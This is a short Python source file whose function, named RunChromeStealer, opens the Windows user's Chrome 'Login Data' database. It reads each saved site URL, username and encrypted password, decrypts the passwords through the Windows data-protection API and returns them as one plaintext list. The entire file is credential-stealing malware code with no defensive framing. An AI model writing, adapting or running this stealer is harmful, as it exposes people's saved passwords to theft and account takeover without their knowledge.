import os
import sqlite3
import win32crypt


def RunChromeStealer():

        #path to user's login data
        data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"

        login_db = os.path.join(data_path, 'Login Data')

        #db connect and query
        c = sqlite3.connect(login_db)
        cursor = c.cursor()
        select_statement = "SELECT origin_url, username_value, password_value FROM logins"
        cursor.execute(select_statement)

        login_data = cursor.fetchall()

        #URL: credentials dictionary
        credential = {}

        #decrytping the password
        for url, user_name, pwd, in login_data:
            pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) #This returns a tuple description and the password
            credential[url] = (user_name, pwd[1])

        FinalCredentialList = ""
        for url, credentials in credential.iteritems():
                    if credentials[1]:
                        FinalCredentialList += "\n"+url+"\n"+credentials[0].encode('utf-8')+ " | "+credentials[1]+"\n"
                    else:
                        FinalCredentialList += "\n"+url+"\n"+"USERNAME NOT FOUND | PASSWORD NOT FOUND \n"
        return FinalCredentialList